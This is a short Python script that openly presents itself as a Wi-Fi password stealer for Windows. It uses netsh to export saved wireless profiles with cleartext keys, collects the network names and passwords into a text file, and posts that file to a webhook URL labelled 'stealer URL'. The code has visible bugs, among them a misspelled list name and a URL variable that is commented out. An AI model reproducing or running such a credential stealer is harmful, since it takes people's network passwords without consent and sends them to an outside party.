import subprocess
import os
import sys
import requests
#pip install requests


#stealer URL
#url = '#copy from webhook#'

#create a file
password_file = open('passwords.txt', "w")
password_file.write("hello sir! here are your password:\n\n")
password_file.close()

#lists
wifi_files = []
wifi_name = []
wifi_password = []


#use python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

#grab current directory
path = os.getcwd()

#do the hackings
for filename in os.listdir(path):
	if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
		wifi_files.append(filename)
		for i in wifi_files:
			with open(i, 'r') as f:
				for line in f.readlines():
					if 'name' in line:
						stripped = line.strip()
						front = stripped[6:]
						back = front[:-7]
						wife_name.append(back)
					if 'keymaterial' in line:
						stripped = line.strip()
						front = stripped[13:]
						back = front[:-14]
						wifi_password.append(back)
						for x,y in zip(wifi_name, wifi_password):
							sys.stdout = open("passwords.txt", "a")
							print("SSID: "+x, "Password: "+y, sep='\n')
							sys.stdout.close()
#send the hackers
with open('passwords.txt', 'rb') as f:
	r = requests.post(url, data=f)